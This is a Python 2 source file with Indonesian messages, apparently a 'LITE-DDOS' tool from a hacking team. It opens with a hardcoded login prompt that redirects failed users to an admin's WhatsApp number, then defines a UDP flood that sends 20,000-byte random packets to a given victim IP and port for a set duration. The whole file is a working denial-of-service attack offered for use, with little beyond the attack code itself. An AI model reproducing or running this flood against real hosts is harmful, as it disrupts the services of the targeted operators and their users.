import os, sys
print '\x1b[1;32mUdah Punya ID dan Password untuk Login?? Kalo dah punya silahkan masukan Jika Tidak Punya Ketik asal asal aja ntar di arahkan ke wa admin dan tanyakan user dan password yang:) dan jangan lupa login facebook di OperaMini dulu sebelum login agar tidak CekPoint:v'
print '\x1b[1;32mSilahkan Login '
import os, sys

def wa():
    os.system('xdg-open https://api.whatsapp.com/send?phone=+6285647761959&text=Assalamualaikum')


def restart():
    ngulang = sys.executable
    os.execl(ngulang, ngulang, *sys.argv)


user = raw_input('ID: ')
import getpass
sandi = raw_input('Password: ')
if sandi == 'indoxploit' and user == 'Borot':
    print 'Login Berhasil✓'
    sys.exit
else:
    print 'Login GAGAL×, Silahkan hubungi ADMIN'
    wa()


import time
import socket
import random
import sys
def usage():
    print "\033[1;32m#########################################################"
    print "#------------------------[\033[1;91mLITE-DDOS\033[1;32m]---------------------#"
    print "#-------------------------------------------------------#"
    print "#   \033[1;91mCommand: " "python2 DDOS.py " "<ip> <port> <packet> \033[1;32m   #"
    print "#                                                       #"
    print "#\033[1;91mPembuat:MR.L4M3R  \033[1;32m##      ###       ##                #"
    print "#\033[1;91mTeam   : SUMBER CYBER TEAM        \033[1;32m##     #     NGERI:V     ##                #"
    print "#\033[1;91mVersion:1.0        \033[1;32m##      ###       ##                #"
    print "#                   ## \033[1;91m ##     \033[1;32m#  \033[1;91m##  \033[1;32m##                #"
    print "#                   ##  \033[1;91m##  \033[1;32m###   \033[1;91m##  \033[1;32m######            #"
    print "#               \033[1;91m<--[Sumber Security Lite]-->         \033[1;32m#"
    print "#########################################################"
    print "                        @@@@@@@@@@"
    print "                       @@@@@@@@@@@@"
    print "                     @@@@@@@@@@@@@@@@"
def flood(victim, vport, duration):
    # Support us yaakk... :)
    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 representasi satu byte ke server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mMemulai Serangan Ke \033[1;32m%s \033[1;91mmengirim serangan  \033[1;32m%s \033[1;91mkepada port \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
